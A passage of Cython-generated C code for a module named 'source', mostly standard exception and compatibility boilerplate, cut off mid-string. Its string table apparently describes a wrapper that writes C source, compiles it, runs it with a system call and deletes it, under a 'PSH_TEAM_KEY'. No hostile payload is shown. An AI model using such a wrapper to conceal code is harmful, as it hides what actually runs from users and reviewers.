#define __Pyx_ExceptionReset(type, value, tb)  __Pyx__ExceptionReset(__pyx_tstate, type, value, tb)
static CYTHON_INLINE void __Pyx__ExceptionReset(PyThreadState *tstate, PyObject *type, PyObject *value, PyObject *tb);
#else
#define __Pyx_ExceptionSave(type, value, tb)   PyErr_GetExcInfo(type, value, tb)
#define __Pyx_ExceptionReset(type, value, tb)  PyErr_SetExcInfo(type, value, tb)
#endif

/* GetException.proto */
#if CYTHON_FAST_THREAD_STATE
#define __Pyx_GetException(type, value, tb)  __Pyx__GetException(__pyx_tstate, type, value, tb)
static int __Pyx__GetException(PyThreadState *tstate, PyObject **type, PyObject **value, PyObject **tb);
#else
static int __Pyx_GetException(PyObject **type, PyObject **value, PyObject **tb);
#endif

/* PyErrFetchRestore.proto */
#if CYTHON_FAST_THREAD_STATE
#define __Pyx_PyErr_Clear() __Pyx_ErrRestore(NULL, NULL, NULL)
#define __Pyx_ErrRestoreWithState(type, value, tb)  __Pyx_ErrRestoreInState(PyThreadState_GET(), type, value, tb)
#define __Pyx_ErrFetchWithState(type, value, tb)    __Pyx_ErrFetchInState(PyThreadState_GET(), type, value, tb)
#define __Pyx_ErrRestore(type, value, tb)  __Pyx_ErrRestoreInState(__pyx_tstate, type, value, tb)
#define __Pyx_ErrFetch(type, value, tb)    __Pyx_ErrFetchInState(__pyx_tstate, type, value, tb)
static CYTHON_INLINE void __Pyx_ErrRestoreInState(PyThreadState *tstate, PyObject *type, PyObject *value, PyObject *tb);
static CYTHON_INLINE void __Pyx_ErrFetchInState(PyThreadState *tstate, PyObject **type, PyObject **value, PyObject **tb);
#if CYTHON_COMPILING_IN_CPYTHON
#define __Pyx_PyErr_SetNone(exc) (Py_INCREF(exc), __Pyx_ErrRestore((exc), NULL, NULL))
#else
#define __Pyx_PyErr_SetNone(exc) PyErr_SetNone(exc)
#endif
#else
#define __Pyx_PyErr_Clear() PyErr_Clear()
#define __Pyx_PyErr_SetNone(exc) PyErr_SetNone(exc)
#define __Pyx_ErrRestoreWithState(type, value, tb)  PyErr_Restore(type, value, tb)
#define __Pyx_ErrFetchWithState(type, value, tb)  PyErr_Fetch(type, value, tb)
#define __Pyx_ErrRestoreInState(tstate, type, value, tb)  PyErr_Restore(type, value, tb)
#define __Pyx_ErrFetchInState(tstate, type, value, tb)  PyErr_Fetch(type, value, tb)
#define __Pyx_ErrRestore(type, value, tb)  PyErr_Restore(type, value, tb)
#define __Pyx_ErrFetch(type, value, tb)  PyErr_Fetch(type, value, tb)
#endif

/* CLineInTraceback.proto */
#ifdef CYTHON_CLINE_IN_TRACEBACK
#define __Pyx_CLineForTraceback(tstate, c_line)  (((CYTHON_CLINE_IN_TRACEBACK)) ? c_line : 0)
#else
static int __Pyx_CLineForTraceback(PyThreadState *tstate, int c_line);
#endif

/* CodeObjectCache.proto */
typedef struct {
    PyCodeObject* code_object;
    int code_line;
} __Pyx_CodeObjectCacheEntry;
struct __Pyx_CodeObjectCache {
    int count;
    int max_count;
    __Pyx_CodeObjectCacheEntry* entries;
};
static struct __Pyx_CodeObjectCache __pyx_code_cache = {0,0,NULL};
static int __pyx_bisect_code_objects(__Pyx_CodeObjectCacheEntry* entries, int count, int code_line);
static PyCodeObject *__pyx_find_code_object(int code_line);
static void __pyx_insert_code_object(int code_line, PyCodeObject* code_object);

/* AddTraceback.proto */
static void __Pyx_AddTraceback(const char *funcname, int c_line,
                               int py_line, const char *filename);

/* GCCDiagnostics.proto */
#if defined(__GNUC__) && (__GNUC__ > 4 || (__GNUC__ == 4 && __GNUC_MINOR__ >= 6))
#define __Pyx_HAS_GCC_DIAGNOSTIC
#endif

/* CIntToPy.proto */
static CYTHON_INLINE PyObject* __Pyx_PyInt_From_long(long value);

/* CIntFromPy.proto */
static CYTHON_INLINE long __Pyx_PyInt_As_long(PyObject *);

/* CIntFromPy.proto */
static CYTHON_INLINE int __Pyx_PyInt_As_int(PyObject *);

/* FastTypeChecks.proto */
#if CYTHON_COMPILING_IN_CPYTHON
#define __Pyx_TypeCheck(obj, type) __Pyx_IsSubtype(Py_TYPE(obj), (PyTypeObject *)type)
static CYTHON_INLINE int __Pyx_IsSubtype(PyTypeObject *a, PyTypeObject *b);
static CYTHON_INLINE int __Pyx_PyErr_GivenExceptionMatches(PyObject *err, PyObject *type);
static CYTHON_INLINE int __Pyx_PyErr_GivenExceptionMatches2(PyObject *err, PyObject *type1, PyObject *type2);
#else
#define __Pyx_TypeCheck(obj, type) PyObject_TypeCheck(obj, (PyTypeObject *)type)
#define __Pyx_PyErr_GivenExceptionMatches(err, type) PyErr_GivenExceptionMatches(err, type)
#define __Pyx_PyErr_GivenExceptionMatches2(err, type1, type2) (PyErr_GivenExceptionMatches(err, type1) || PyErr_GivenExceptionMatches(err, type2))
#endif
#define __Pyx_PyException_Check(obj) __Pyx_TypeCheck(obj, PyExc_Exception)

/* CheckBinaryVersion.proto */
static int __Pyx_check_binary_version(void);

/* InitStrings.proto */
static int __Pyx_InitStrings(__Pyx_StringTabEntry *t);


/* Module declarations from 'source' */
#define __Pyx_MODULE_NAME "source"
extern int __pyx_module_is_main_source;
int __pyx_module_is_main_source = 0;

/* Implementation of 'source' */
static PyObject *__pyx_builtin_exit;
static PyObject *__pyx_builtin_open;
static const char __pyx_k_f[] = "f";
static const char __pyx_k_os[] = "os";
static const char __pyx_k_RUN[] = "RUN";
static const char __pyx_k_sys[] = "sys";
static const char __pyx_k_exit[] = "exit";
static const char __pyx_k_main[] = "__main__";
static const char __pyx_k_name[] = "__name__";
static const char __pyx_k_open[] = "open";
static const char __pyx_k_path[] = "path";
static const char __pyx_k_test[] = "__test__";
static const char __pyx_k_enter[] = "__enter__";
static const char __pyx_k_split[] = "split";
static const char __pyx_k_write[] = "write";
static const char __pyx_k_C_FILE[] = "C_FILE";
static const char __pyx_k_PREFIX[] = "PREFIX";
static const char __pyx_k_exit_2[] = "__exit__";
static const char __pyx_k_import[] = "__import__";
static const char __pyx_k_isfile[] = "isfile";
static const char __pyx_k_prefix[] = "prefix";
static const char __pyx_k_remove[] = "remove";
static const char __pyx_k_system[] = "system";
static const char __pyx_k_dirname[] = "dirname";
static const char __pyx_k_version[] = "version";
static const char __pyx_k_C_SOURCE[] = "C_SOURCE";
static const char __pyx_k_exist_ok[] = "exist_ok";
static const char __pyx_k_makedirs[] = "makedirs";
static const char __pyx_k_executable[] = "executable";
static const char __pyx_k_COMPILE_FILE[] = "COMPILE_FILE";
static const char __pyx_k_EXECUTE_FILE[] = "EXECUTE_FILE";
static const char __pyx_k_PSH_TEAM_KEY[] = "PSH_TEAM_KEY";
static const char __pyx_k_PYTHON_VERSION[] = "PYTHON_VERSION";
static const char __pyx_k_EXPORT_PYTHONHOME[] = "EXPORT_PYTHONHOME";
static const char __pyx_k_cline_in_traceback[] = "cline_in_traceback";
static const char __pyx_k_EXPORT_PYTHON_EXECUTABLE[] = "EXPORT_PYTHON_EXECUTABLE";
static const char __pyx_k_ifndef_PY_SSIZE_T_CLEAN_define[] = "#ifndef PY_SSIZE_T_CLEAN\n#define PY_SSIZE_T_CLEAN\n#endif /* PY_SSIZE_T_CLEAN */\n#include \"Python.h\"\n#ifndef Py_PYTHON_H\n    #error Python headers needed to compile C extensions, please install development version of Python.\n#elif PY_VERSION_HEX < 0x02060000 || (0x03000000 <= PY_VERSION_HEX && PY_VERSION_HEX < 0x03030000)\n    #error Cython requires Python 2.6+ or Python 3.3+.\n#else\n#define CYTHON_ABI \"0_29_33\"\n#define CYTHON_HEX_VERSION 0x001D21F0\n#define CYTHON_FUTURE_DIVISION 1\n#include <stddef.h>\n#ifndef offsetof\n  #define offsetof(type, member) ( (size_t) & ((type*)0) -> member )\n#endif\n#if !defined(WIN32) && !defined(MS_WINDOWS)\n  #ifndef __stdcall\n    #define __stdcall\n  #endif\n  #ifndef __cdecl\n    #define __cdecl\n  #endif\n  #ifndef __fastcall\n    #define __fastcall\n  #endif\n#endif\n#ifndef DL_IMPORT\n  #define DL_IMPORT(t) t\n#endif\n#ifndef DL_EXPORT\n  #define DL_EXPORT(t) t\n#endif\n#define __PYX_COMMA ,\n#ifndef HAVE_LONG_LONG\n  #if PY_VERSION_HEX >= 0x02070000\n    #define HAVE_LONG_LONG\n  #endif\n#endif\n#ifndef PY_LONG_LONG\n  #define PY_LONG_LONG LONG_LONG\n#endif\n#ifndef Py_HUGE_VAL\n  #define Py_HUGE_VAL HUGE_VAL\n#endif\n#ifdef PYPY_VERSION\n  #define CYTHON_COMPILING_IN_PYPY 1\n  #define CYTHON_COMPILING_IN_PYSTON 0\n  #define CYTHON_COMPILING_IN_CPYTHON 0\n  #define CYTHON_COMPILING_IN_NOGIL 0\n  #undef CYTHON_USE_TYPE_SLOTS\n  #define CYTHON_USE_TYPE_SLOTS 0\n  #undef CYTHON_USE_PYTYPE_LOOKUP\n  #define CYTHON_USE_PYTYPE_LOOKUP 0\n  #if PY_VERSION_HEX < 0x03050000\n    #undef CYTHON_USE_ASYNC_SLOTS\n    #define CYTHON_USE_ASYNC_SLOTS 0\n  #elif !defined(CYTHON_USE_ASYNC_SLOTS)\n    #define CYTHON_USE_ASYNC_SLOTS 1\n  #endif\n  #undef CYTHON_USE_PYLIST_INTERNALS\n  #define CYTHON_USE_PYLIST_INTERNALS 0\n  #undef CYTHON_USE_UNICODE_INTERNALS\n  #define CYTHON_USE_UNICODE_INTERNALS 0\n  #undef CYTHON_USE_UNICODE_WRITER\n  #define CYTHON_USE_UNICODE_WRITER 0\n  #undef CYTHON_USE_PYLONG_INTERNALS\n  #define CYTHON_USE""_PYLONG_INTERNALS 0\n  #undef CYTHON_AVOID_BORROWED_REFS\n  #define CYTHON_AVOID_BORROWED_REFS 1\n  #undef CYTHON_ASSUME_SAFE_MACROS\n  #define CYTHON_ASSUME_SAFE_MACROS 0\n  #undef CYTHON_UNPACK_METHODS\n  #define CYTHON_UNPACK_METHODS 0\n  #undef CYTHON_FAST_THREAD_STATE\n  #define CYTHON_FAST_THREAD_STATE 0\n  #undef CYTHON_FAST_PYCALL\n  #define CYTHON_FAST_PYCALL 0\n  #undef CYTHON_PEP489_MULTI_PHASE_INIT\n  #define CYTHON_PEP489_MULTI_PHASE_INIT 0\n  #undef CYTHON_USE_TP_FINALIZE\n  #define CYTHON_USE_TP_FINALIZE 0\n  #undef CYTHON_USE_DICT_VERSIONS\n  #define CYTHON_USE_DICT_VERSIONS 0\n  #undef CYTHON_USE_EXC_INFO_STACK\n  #define CYTHON_USE_EXC_INFO_STACK 0\n  #ifndef CYTHON_UPDATE_DESCRIPTOR_DOC\n    #define CYTHON_UPDATE_DESCRIPTOR_DOC 0\n  #endif\n#elif defined(PYSTON_VERSION)\n  #define CYTHON_COMPILING_IN_PYPY 0\n  #define CYTHON_COMPILING_IN_PYSTON 1\n  #define CYTHON_COMPILING_IN_CPYTHON 0\n  #define CYTHON_COMPILING_IN_NOGIL 0\n  #ifndef CYTHON_USE_TYPE_SLOTS\n    #define CYTHON_USE_TYPE_SLOTS 1\n  #endif\n  #undef CYTHON_USE_PYTYPE_LOOKUP\n  #define CYTHON_USE_PYTYPE_LOOKUP 0\n  #undef CYTHON_USE_ASYNC_SLOTS\n  #define CYTHON_USE_ASYNC_SLOTS 0\n  #undef CYTHON_USE_PYLIST_INTERNALS\n  #define CYTHON_USE_PYLIST_INTERNALS 0\n  #ifndef CYTHON_USE_UNICODE_INTERNALS\n    #define CYTHON_USE_UNICODE_INTERNALS 1\n  #endif\n  #undef CYTHON_USE_UNICODE_WRITER\n  #define CYTHON_USE_UNICODE_WRITER 0\n  #undef CYTHON_USE_PYLONG_INTERNALS\n  #define CYTHON_USE_PYLONG_INTERNALS 0\n  #ifndef CYTHON_AVOID_BORROWED_REFS\n    #define CYTHON_AVOID_BORROWED_REFS 0\n  #endif\n  #ifndef CYTHON_ASSUME_SAFE_MACROS\n    #define CYTHON_ASSUME_SAFE_MACROS 1\n  #endif\n  #ifndef CYTHON_UNPACK_METHODS\n    #define CYTHON_UNPACK_METHODS 1\n  #endif\n  #undef CYTHON_FAST_THREAD_STATE\n  #define CYTHON_FAST_THREAD_STATE 0\n  #undef CYTHON_FAST_PYCALL\n  #define CYTHON_FAST_PYCALL 0\n  #undef CYTHON_PEP489_MULTI_PHASE_INIT\n  #define CYTHON_PEP489_MULTI_PHASE_INIT 0\n  #undef CYTHON""_USE_TP_FINALIZE\n  #define CYTHON_USE_TP_FINALIZE 0\n  #undef CYTHON_USE_DICT_VERSIONS\n  #define CYTHON_USE_DICT_VERSIONS 0\n  #undef CYTHON_USE_EXC_INFO_STACK\n  #define CYTHON_USE_EXC_INFO_STACK 0\n  #ifndef CYTHON_UPDATE_DESCRIPTOR_DOC\n    #define CYTHON_UPDATE_DESCRIPTOR_DOC 0\n  #endif\n#elif defined(PY_NOGIL)\n  #define CYTHON_COMPILING_IN_PYPY 0\n  #define CYTHON_COMPILING_IN_PYSTON 0\n  #define CYTHON_COMPILING_IN_CPYTHON 0\n  #define CYTHON_COMPILING_IN_NOGIL 1\n  #ifndef CYTHON_USE_TYPE_SLOTS\n    #define CYTHON_USE_TYPE_SLOTS 1\n  #endif\n  #undef CYTHON_USE_PYTYPE_LOOKUP\n  #define CYTHON_USE_PYTYPE_LOOKUP 0\n  #ifndef CYTHON_USE_ASYNC_SLOTS\n    #define CYTHON_USE_ASYNC_SLOTS 1\n  #endif\n  #undef CYTHON_USE_PYLIST_INTERNALS\n  #define CYTHON_USE_PYLIST_INTERNALS 0\n  #ifndef CYTHON_USE_UNICODE_INTERNALS\n    #define CYTHON_USE_UNICODE_INTERNALS 1\n  #endif\n  #undef CYTHON_USE_UNICODE_WRITER\n  #define CYTHON_USE_UNICODE_WRITER 0\n  #undef CYTHON_USE_PYLONG_INTERNALS\n  #define CYTHON_USE_PYLONG_INTERNALS 0\n  #ifndef CYTHON_AVOID_BORROWED_REFS\n    #define CYTHON_AVOID_BORROWED_REFS 0\n  #endif\n  #ifndef CYTHON_ASSUME_SAFE_MACROS\n    #define CYTHON_ASSUME_SAFE_MACROS 1\n  #endif\n  #ifndef CYTHON_UNPACK_METHODS\n    #define CYTHON_UNPACK_METHODS 1\n  #endif\n  #undef CYTHON_FAST_THREAD_STATE\n  #define CYTHON_FAST_THREAD_STATE 0\n  #undef CYTHON_FAST_PYCALL\n  #define CYTHON_FAST_PYCALL 0\n  #ifndef CYTHON_PEP489_MULTI_PHASE_INIT\n    #define CYTHON_PEP489_MULTI_PHASE_INIT 1\n  #endif\n  #ifndef CYTHON_USE_TP_FINALIZE\n    #define CYTHON_USE_TP_FINALIZE 1\n  #endif\n  #undef CYTHON_USE_DICT_VERSIONS\n  #define CYTHON_USE_DICT_VERSIONS 0\n  #undef CYTHON_USE_EXC_INFO_STACK\n  #define CYTHON_USE_EXC_INFO_STACK 0\n#else\n  #define CYTHON_COMPILING_IN_PYPY 0\n  #define CYTHON_COMPILING_IN_PYSTON 0\n  #define CYTHON_COMPILING_IN_CPYTHON 1\n  #define CYTHON_COMPILING_IN_NOGIL 0\n  #ifndef CYTHON_USE_TYPE_SLOTS\n    #define CYTHON_USE_TYPE_SLOTS 1\n  #e""ndif\n  #if PY_VERSION_HEX < 0x02070000\n    #undef CYTHON_USE_PYTYPE_LOOKUP\n    #define CYTHON_USE_PYTYPE_LOOKUP 0\n  #elif !defined(CYTHON_USE_PYTYPE_LOOKUP)\n    #define CYTHON_USE_PYTYPE_LOOKUP 1\n  #endif\n  #if PY_MAJOR_VERSION < 3\n    #undef CYTHON_USE_ASYNC_SLOTS\n    #define CYTHON_USE_ASYNC_SLOTS 0\n  #elif !defined(CYTHON_USE_ASYNC_SLOTS)\n    #define CYTHON_USE_ASYNC_SLOTS 1\n  #endif\n  #if PY_VERSION_HEX < 0x02070000\n    #undef CYTHON_USE_PYLONG_INTERNALS\n    #define CYTHON_USE_PYLONG_INTERNALS 0\n  #elif !defined(CYTHON_USE_PYLONG_INTERNALS)\n    #define CYTHON_USE_PYLONG_INTERNALS 1\n  #endif\n  #ifndef CYTHON_USE_PYLIST_INTERNALS\n    #define CYTHON_USE_PYLIST_INTERNALS 1\n  #endif\n  #ifndef CYTHON_USE_UNICODE_INTERNALS\n    #define CYTHON_USE_UNICODE_INTERNALS 1\n  #endif\n  #if PY_VERSION_HEX < 0x030300F0 || PY_VERSION_HEX >= 0x030B00A2\n    #undef CYTHON_USE_UNICODE_WRITER\n    #define CYTHON_USE_UNICODE_WRITER 0\n  #elif !defined(CYTHON_USE_UNICODE_WRITER)\n    #define CYTHON_USE_UNICODE_WRITER 1\n  #endif\n  #ifndef CYTHON_AVOID_BORROWED_REFS\n    #define CYTHON_AVOID_BORROWED_REFS 0\n  #endif\n  #ifndef CYTHON_ASSUME_SAFE_MACROS\n    #define CYTHON_ASSUME_SAFE_MACROS 1\n  #endif\n  #ifndef CYTHON_UNPACK_METHODS\n    #define CYTHON_UNPACK_METHODS 1\n  #endif\n  #if PY_VERSION_HEX >= 0x030B00A4\n    #undef CYTHON_FAST_THREAD_STATE\n    #define CYTHON_FAST_THREAD_STATE 0\n  #elif !defined(CYTHON_FAST_THREAD_STATE)\n    #define CYTHON_FAST_THREAD_STATE 1\n  #endif\n  #ifndef CYTHON_FAST_PYCALL\n    #define CYTHON_FAST_PYCALL (PY_VERSION_HEX < 0x030A0000)\n  #endif\n  #ifndef CYTHON_PEP489_MULTI_PHASE_INIT\n    #define CYTHON_PEP489_MULTI_PHASE_INIT (PY_VERSION_HEX >= 0x03050000)\n  #endif\n  #ifndef CYTHON_USE_TP_FINALIZE\n    #define CYTHON_USE_TP_FINALIZE (PY_VERSION_HEX >= 0x030400a1)\n  #endif\n  #ifndef CYTHON_USE_DICT_VERSIONS\n    #define CYTHON_USE_DICT_VERSIONS (PY_VERSION_HEX >= 0x030600B1)\n  #endif\n  #if PY_VERSION_HEX >= 0x030B0""0A4\n    #undef CYTHON_USE_EXC_INFO_STACK\n    #define CYTHON_USE_EXC_INFO_STACK 0\n  #elif !defined(CYTHON_USE_EXC_INFO_STACK)\n    #define CYTHON_USE_EXC_INFO_STACK (PY_VERSION_HEX >= 0x030700A3)\n  #endif\n  #ifndef CYTHON_UPDATE_DESCRIPTOR_DOC\n    #define CYTHON_UPDATE_DESCRIPTOR_DOC 1\n  #endif\n#endif\n#if !defined(CYTHON_FAST_PYCCALL)\n#define CYTHON_FAST_PYCCALL  (CYTHON_FAST_PYCALL && PY_VERSION_HEX >= 0x030600B1)\n#endif\n#if CYTHON_USE_PYLONG_INTERNALS\n  #if PY_MAJOR_VERSION < 3\n    #include \"longintrepr.h\"\n  #endif\n  #undef SHIFT\n  #undef BASE\n  #undef MASK\n  #ifdef SIZEOF_VOID_P\n    enum { __pyx_check_sizeof_voidp = 1 / (int)(SIZEOF_VOID_P == sizeof(void*)) };\n  #endif\n#endif\n#ifndef __has_attribute\n  #define __has_attribute(x) 0\n#endif\n#ifndef __has_cpp_attribute\n  #define __has_cpp_attribute(x) 0\n#endif\n#ifndef CYTHON_RESTRICT\n  #if defined(__GNUC__)\n    #define CYTHON_RESTRICT __restrict__\n  #elif defined(_MSC_VER) && _MSC_VER >= 1400\n    #define CYTHON_RESTRICT __restrict\n  #elif defined (__STDC_VERSION__) && __STDC_VERSION__ >= 199901L\n    #define CYTHON_RESTRICT restrict\n  #else\n    #define CYTHON_RESTRICT\n  #endif\n#endif\n#ifndef CYTHON_UNUSED\n# if defined(__GNUC__)\n#   if !(defined(__cplusplus)) || (__GNUC__ > 3 || (__GNUC__ == 3 && __GNUC_MINOR__ >= 4))\n#     define CYTHON_UNUSED __attribute__ ((__unused__))\n#   else\n#     define CYTHON_UNUSED\n#   endif\n# elif defined(__ICC) || (defined(__INTEL_COMPILER) && !defined(_MSC_VER))\n#   define CYTHON_UNUSED __attribute__ ((__unused__))\n# else\n#   define CYTHON_UNUSED\n# endif\n#endif\n#ifndef CYTHON_MAYBE_UNUSED_VAR\n#  if defined(__cplusplus)\n     template<class T> void CYTHON_MAYBE_UNUSED_VAR( const T& ) { }\n#  else\n#    define CYTHON_MAYBE_UNUSED_VAR(x) (void)(x)\n#  endif\n#endif\n#ifndef CYTHON_NCP_UNUSED\n# if CYTHON_COMPILING_IN_CPYTHON\n#  define CYTHON_NCP_UNUSED\n# else\n#  define CYTHON_NCP_UNUSED CYTHON_UNUSED\n# endif\n#endif\n#define __Pyx_void""_to_None(void_result) ((void)(void_result), Py_INCREF(Py_None), Py_None)\n#ifdef _MSC_VER\n    #ifndef _MSC_STDINT_H_\n        #if _MSC_VER < 1300\n           typedef unsigned char     uint8_t;\n           typedef unsigned int      uint32_t;\n        #else\n           typedef unsigned __int8   uint8_t;\n           typedef unsigned __int32  uint32_t;\n        #endif\n    #endif\n#else\n   #include <stdint.h>\n#endif\n#ifndef CYTHON_FALLTHROUGH\n  #if defined(__cplusplus) && __cplusplus >= 201103L\n    #if __has_cpp_attribute(fallthrough)\n      #define CYTHON_FALLTHROUGH [[fallthrough]]\n    #elif __has_cpp_attribute(clang::fallthrough)\n      #define CYTHON_FALLTHROUGH [[clang::fallthrough]]\n    #elif __has_cpp_attribute(gnu::fallthrough)\n      #define CYTHON_FALLTHROUGH [[gnu::fallthrough]]\n    #endif\n  #endif\n  #ifndef CYTHON_FALLTHROUGH\n    #if __has_attribute(fallthrough)\n      #define CYTHON_FALLTHROUGH __attribute__((fallthrough))\n    #else\n      #define CYTHON_FALLTHROUGH\n    #endif\n  #endif\n  #if defined(__clang__ ) && defined(__apple_build_version__)\n    #if __apple_build_version__ < 7000000\n      #undef  CYTHON_FALLTHROUGH\n      #define CYTHON_FALLTHROUGH\n    #endif\n  #endif\n#endif\n\n#ifndef CYTHON_INLINE\n  #if defined(__clang__)\n    #define CYTHON_INLINE __inline__ __attribute__ ((__unused__))\n  #elif defined(__GNUC__)\n    #define CYTHON_INLINE __inline__\n  #elif defined(_MSC_VER)\n    #define CYTHON_INLINE __inline\n  #elif defined (__STDC_VERSION__) && __STDC_VERSION__ >= 199901L\n    #define CYTHON_INLINE inline\n  #else\n    #define CYTHON_INLINE\n  #endif\n#endif\n\n#if CYTHON_COMPILING_IN_PYPY && PY_VERSION_HEX < 0x02070600 && !defined(Py_OptimizeFlag)\n  #define Py_OptimizeFlag 0\n#endif\n#define __PYX_BUILD_PY_SSIZE_T \"n\"\n#define CYTHON_FORMAT_SSIZE_T \"z\"\n#if PY_MAJOR_VERSION < 3\n  #define __Pyx_BUILTIN_MODULE_NAME \"__builtin__\"\n  #define __Pyx_PyCode_New(a, k, l, s, f, code, c, n, v, fv, cell, fn, name, fline, ln""os)\\\n          PyCode_New(a+k, l, s, f, code, c, n, v, fv, cell, fn, name, fline, lnos)\n  #define __Pyx_DefaultClassType PyClass_Type\n#else\n  #define __Pyx_BUILTIN_MODULE_NAME \"builtins\"\n  #define __Pyx_DefaultClassType PyType_Type\n#if PY_VERSION_HEX >= 0x030B00A1\n    static CYTHON_INLINE PyCodeObject* __Pyx_PyCode_New(int a, int k, int l, int s, int f,\n                                                    PyObject *code, PyObject *c, PyObject* n, PyObject *v,\n                                                    PyObject *fv, PyObject *cell, PyObject* fn,\n                                                    PyObject *name, int fline, PyObject *lnos) {\n        PyObject *kwds=NULL, *argcount=NULL, *posonlyargcount=NULL, *kwonlyargcount=NULL;\n        PyObject *nlocals=NULL, *stacksize=NULL, *flags=NULL, *replace=NULL, *call_result=NULL, *empty=NULL;\n        const char *fn_cstr=NULL;\n        const char *name_cstr=NULL;\n        PyCodeObject* co=NULL;\n        PyObject *type, *value, *traceback;\n        PyErr_Fetch(&type, &value, &traceback);\n        if (!(kwds=PyDict_New())) goto end;\n        if (!(argcount=PyLong_FromLong(a))) goto end;\n        if (PyDict_SetItemString(kwds, \"co_argcount\", argcount) != 0) goto end;\n        if (!(posonlyargcount=PyLong_FromLong(0))) goto end;\n        if (PyDict_SetItemString(kwds, \"co_posonlyargcount\", posonlyargcount) != 0) goto end;\n        if (!(kwonlyargcount=PyLong_FromLong(k))) goto end;\n        if (PyDict_SetItemString(kwds, \"co_kwonlyargcount\", kwonlyargcount) != 0) goto end;\n        if (!(nlocals=PyLong_FromLong(l))) goto end;\n        if (PyDict_SetItemString(kwds, \"co_nlocals\", nlocals) != 0) goto end;\n        if (!(stacksize=PyLong_FromLong(s))) goto end;\n        if (PyDict_SetItemString(kwds, \"co_stacksize\", stacksize) != 0) goto end;\n        if (!(flags=PyLong_FromLong(f))) goto end;\n        if (PyDict_SetItemString(kwds, \"co_flags\", flags) != 0) goto end;\n        if (PyDict_SetItemSt""ring(kwds, \"co_code\", code) != 0) goto end;\n        if (PyDict_SetItemString(kwds, \"co_consts\", c) != 0) goto end;\n        if (PyDict_SetItemString(kwds, \"co_names\", n) != 0) goto end;\n        if (PyDict_SetItemString(kwds, \"co_varnames\", v) != 0) goto end;\n        if (PyDict_SetItemString(kwds, \"co_freevars\", fv) != 0) goto end;\n        if (PyDict_SetItemString(kwds, \"co_cellvars\", cell) != 0) goto end;\n        if (PyDict_SetItemString(kwds, \"co_linetable\", lnos) != 0) goto end;\n        if (!(fn_cstr=PyUnicode_AsUTF8AndSize(fn, NULL))) goto end;\n        if (!(name_cstr=PyUnicode_AsUTF8AndSize(name, NULL))) goto end;\n        if (!(co = PyCode_NewEmpty(fn_cstr, name_cstr, fline))) goto end;\n        if (!(replace = PyObject_GetAttrString((PyObject*)co, \"replace\"))) goto cleanup_code_too;\n        if (!(empty = PyTuple_New(0))) goto cleanup_code_too; // unfortunately __pyx_empty_tuple isn't available here\n        if (!(call_result = PyObject_Call(replace, empty, kwds))) goto cleanup_code_too;\n        Py_XDECREF((PyObject*)co);\n        co = (PyCodeObject*)call_result;\n        call_result = NULL;\n        if (0) {\n            cleanup_code_too:\n            Py_XDECREF((PyObject*)co);\n            co = NULL;\n        }\n        end:\n        Py_XDECREF(kwds);\n        Py_XDECREF(argcount);\n        Py_XDECREF(posonlyargcount);\n        Py_XDECREF(kwonlyargcount);\n        Py_XDECREF(nlocals);\n        Py_XDECREF(stacksize);\n        Py_XDECREF(replace);\n        Py_XDECREF(call_result);\n        Py_XDECREF(empty);\n        if (type) {\n            PyErr_Restore(type, value, traceback);\n        }\n        return co;\n    }\n#else\n  #define __Pyx_PyCode_New(a, k, l, s, f, code, c, n, v, fv, cell, fn, name, fline, lnos)\\\n          PyCode_New(a, k, l, s, f, code, c, n, v, fv, cell, fn, name, fline, lnos)\n#endif\n  #define __Pyx_DefaultClassType PyType_Type\n#endif\n#ifndef Py_TPFLAGS_CHECKTYPES\n  #define Py_TPFLAGS_CHECKTYPES 0\n#endif\n#if""ndef Py_TPFLAGS_HAVE_INDEX\n  #define Py_TPFLAGS_HAVE_INDEX 0\n#endif\n#ifndef Py_TPFLAGS_HAVE_NEWBUFFER\n  #define Py_TPFLAGS_HAVE_NEWBUFFER 0\n#endif\n#ifndef Py_TPFLAGS_HAVE_FINALIZE\n  #define Py_TPFLAGS_HAVE_FINALIZE 0\n#endif\n#ifndef METH_STACKLESS\n  #define METH_STACKLESS 0\n#endif\n#if PY_VERSION_HEX <= 0x030700A3 || !defined(METH_FASTCALL)\n  #ifndef METH_FASTCALL\n     #define METH_FASTCALL 0x80\n  #endif\n  typedef PyObject *(*__Pyx_PyCFunctionFast) (PyObject *self, PyObject *const *args, Py_ssize_t nargs);\n  typedef PyObject *(*__Pyx_PyCFunctionFastWithKeywords) (PyObject *self, PyObject *const *args,\n                                                          Py_ssize_t nargs, PyObject *kwnames);\n#else\n  #define __Pyx_PyCFunctionFast _PyCFunctionFast\n  #define __Pyx_PyCFunctionFastWithKeywords _PyCFunctionFastWithKeywords\n#endif\n#if CYTHON_FAST_PYCCALL\n#define __Pyx_PyFastCFunction_Check(func)\\\n    ((PyCFunction_Check(func) && (METH_FASTCALL == (PyCFunction_GET_FLAGS(func) & ~(METH_CLASS | METH_STATIC | METH_COEXIST | METH_KEYWORDS | METH_STACKLESS)))))\n#else\n#define __Pyx_PyFastCFunction_Check(func) 0\n#endif\n#if CYTHON_COMPILING_IN_PYPY && !defined(PyObject_Malloc)\n  #define PyObject_Malloc(s)   PyMem_Malloc(s)\n  #define PyObject_Free(p)     PyMem_Free(p)\n  #define PyObject_Realloc(p)  PyMem_Realloc(p)\n#endif\n#if CYTHON_COMPILING_IN_CPYTHON && PY_VERSION_HEX < 0x030400A1\n  #define PyMem_RawMalloc(n)           PyMem_Malloc(n)\n  #define PyMem_RawRealloc(p, n)       PyMem_Realloc(p, n)\n  #define PyMem_RawFree(p)             PyMem_Free(p)\n#endif\n#if CYTHON_COMPILING_IN_PYSTON\n  #define __Pyx_PyCode_HasFreeVars(co)  PyCode_HasFreeVars(co)\n  #define __Pyx_PyFrame_SetLineNumber(frame, lineno) PyFrame_SetLineNumber(frame, lineno)\n#else\n  #define __Pyx_PyCode_HasFreeVars(co)  (PyCode_GetNumFree(co) > 0)\n  #define __Pyx_PyFrame_SetLineNumber(frame, lineno)  (frame)->f_lineno = (lineno)\n#endif\n#if !CYTHON_FAST_THREAD_STATE || PY_VER""SION_HEX < 0x02070000\n  #define __Pyx_PyThreadState_Current PyThreadState_GET()\n#elif PY_VERSION_HEX >= 0x03060000\n  #define __Pyx_PyThreadState_Current _PyThreadState_UncheckedGet()\n#elif PY_VERSION_HEX >= 0x03000000\n  #define __Pyx_PyThreadState_Current PyThreadState_GET()\n#else\n  #define __Pyx_PyThreadState_Current _PyThreadState_Current\n#endif\n#if PY_VERSION_HEX < 0x030700A2 && !defined(PyThread_tss_create) && !defined(Py_tss_NEEDS_INIT)\n#include \"pythread.h\"\n#define Py_tss_NEEDS_INIT 0\ntypedef int Py_tss_t;\nstatic CYTHON_INLINE int PyThread_tss_create(Py_tss_t 